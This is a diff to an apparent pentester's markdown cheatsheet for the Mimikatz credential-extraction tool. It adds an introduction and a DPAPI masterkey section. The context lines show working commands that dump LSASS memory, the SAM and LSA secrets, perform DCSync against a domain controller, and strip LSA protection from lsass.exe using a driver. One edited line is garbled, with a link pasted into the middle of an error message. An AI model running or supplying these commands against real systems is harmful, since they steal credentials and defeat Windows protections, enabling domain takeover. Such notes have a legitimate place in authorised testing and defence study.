@@ -1,5 +1,7 @@
 # Mimikatz Cheatsheet
-Used in Post Privilege Esculation in maintaining [[Persistence]] through credential harvesting and [[Active-Directory-Lateral-Movement]]. Mimikatz is used to dump credentials:
+
+
+[mimikatz](https://github.com/gentilkiwi/mimikatz) is Windows Credential Extraction tool from [gentilkiwi](https://github.com/gentilkiwi). *It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. `mimikatz` can also perform pass-the-hash, pass-the-ticket or build Golden tickets.* Used in Post Privilege Escalation, maintaining [[Persistence]] through credential harvesting and [[Active-Directory-Lateral-Movement]]. Mimikatz is used to dump credentials:
 - From windows protect memory (LSASS) and activity directory domain controller database
 - Kerberos tickets
 	- For all users
@@ -35,6 +37,15 @@ lsadump::sam
 sekurlsa::logonPasswords
 ```
 
+#### DPAPI
+
+[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)*`dpapi::masterkey` describes a Masterkey file and unprotects each Masterkey (key depending). In other words, it can decrypt and request masterkeys from active directory (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)).
+```c
+// The `dpapi::cred` can also display the masterkey location through the `guidMasterKey` value.
+mimikatz # dpapi::masterkey /in:"C:\PATH"
+```
+
+
 ### Extracting NTLM hashes from local SAM
 
 ```powershell
@@ -44,9 +55,8 @@ token::elevate
 lsadump::lsa /patch
 lsadump::sam # Dump SAM database
 ```
-
 ### Extracting NTLM hashes from LSASS memory
-Regularly
+
 ```powershell
 privilege::debug
 token::elevate
@@ -150,7 +160,7 @@ lsadump::dcsync /user:Administrator
 
 ```powershell
 privilege::debug
-# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on me[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)mory (0x00000005)
 # Means LSA protection:
 !+ # mimidrv.sys driver disables LSA protection.
 !processprotect /process:lsass.exe /remove
@@ -208,3 +218,5 @@ done
 ## References
 
 [Custom Mimikatz by s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
+[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)
+[mimikatz](https://github.com/gentilkiwi/mimikatz) 
